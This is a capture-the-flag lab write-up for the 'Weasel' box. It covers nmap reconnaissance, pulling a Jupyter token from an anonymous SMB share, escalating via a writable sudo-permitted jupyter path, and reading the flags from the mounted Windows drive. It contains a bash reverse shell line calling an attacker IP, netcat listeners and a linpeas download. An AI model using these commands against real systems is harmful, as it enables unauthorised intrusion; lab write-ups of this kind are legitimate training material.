# CTF Writeup: Weasel

---

## Reconnaissance

Performed nmap scan on target

```
nmap -sCV 10.10.18.119                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 09:59 CDT
Nmap scan report for 10.10.18.119
Host is up (0.037s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
|_  256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-06T14:59:35+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Not valid before: 2025-09-05T14:49:25
|_Not valid after:  2026-03-07T14:49:25
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8888/tcp open  http          Tornado httpd 6.0.3
|_http-server-header: TornadoServer/6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-06T14:59:30
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.75 seconds
```

The Initial Scan revealed a lot of information. Decided to start enumerating port 8888 first.

Mapped 10.10.18.119 in /etc/hosts to weasel.thm domain.

```
sudo echo "10.10.18.119  weasel.thm" | sudo tee -a /etc/hosts
```

After enumerating the webpage on :8888 we realised it's correlated to an jupyter notebook 
and asks us specifically for the jupyter token to be able to authentificate.

Since we are unable to do any bruteforcing here, I will enumerate smb to potentially find 
the required token.

```
smbclient -L \\\\weasel.thm\\         
Password for [WORKGROUP\unkn0wn]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        datasci-team    Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to weasel.thm failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Since datasci-team is an specific configured share, I will try to access it first.

It actually worked anonymously and I was able to retrieve the jupyter token in smb: \misc\>

```
smbclient \\\\weasel.thm\\datasci-team
Password for [WORKGROUP\unkn0wn]:
Try "help" to get a list of possible commands.
smb: \>
```

Downloaded the token on my local machine.

```
067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
```

## Initial Access 

After Gaining Access to the jupyter page, I immediatly pressed on the "New" button &
it showed me an "Terminal" option, which allowed me to gain a shell on the target server as "dev-datasci"

Since I wanted a shell on my own machine, I utilized a python3 reverse shell and uploaded it on the target web-server by pressing "Upload" button.
Than I started up a listener on port 1234 and went into the terminal of the webpage again and made ./reverse-shell.py

```
nc -lvnp 1234
```

Gained RCE as dev-datasci user

After some manual Enumeration I decided to download linpeas.sh onto the /tmp directory and ran it.

A good find was the sudo -l functionality, we couldn't execute it before since we didn't have the password of dev-datasci

```
User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *

```

Created my own jupyter file with an malicious reverse shell payload and executed it with sudo to retrieve root on wsl.

```
touch jupyter
echo '#!/bin/bash' > jupyter
echo '/bin/bash -i >& /dev/tcp/10.21.156.104/4444 0>&1' >> jupyter
chmod +x jupyter
```

Opened up listener on my local machine on port 4444

```
nc -lvnp 4444
```

Ran command and retrieved root shell on wsl.

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.21.156.104] from (UNKNOWN) [10.10.18.119] 53904
root@DEV-DATASCI-JUP:/home/dev-datasci/.local/bin#
```

Unfortunately the root.txt can't be found in the wsl os, which I already expected since this box is covered as "Windows" Box.
After further inspection /mnt/ there can be a hidden directory named /c found inside it.

Since I know there is a Windows Server running and prolly saved in /c I will utilize the following command, to mount the C: Drive of the Windows System inside /mnt/c

```
mount -t drvfs C: /mnt/c
```

After mounting the C: drive I navigated into /c and displayed all the files there.

Retrieved user.txt in /mnt/c/Users/dev-datasci-lowpriv/Desktop

```
THM{w3as3ls_@nd_pyth0ns}
```

Retrieved root.txt in /mnt/c/Users/Administrator/Desktop

```
THM{evelated_w3as3l_l0ngest_boi}
```
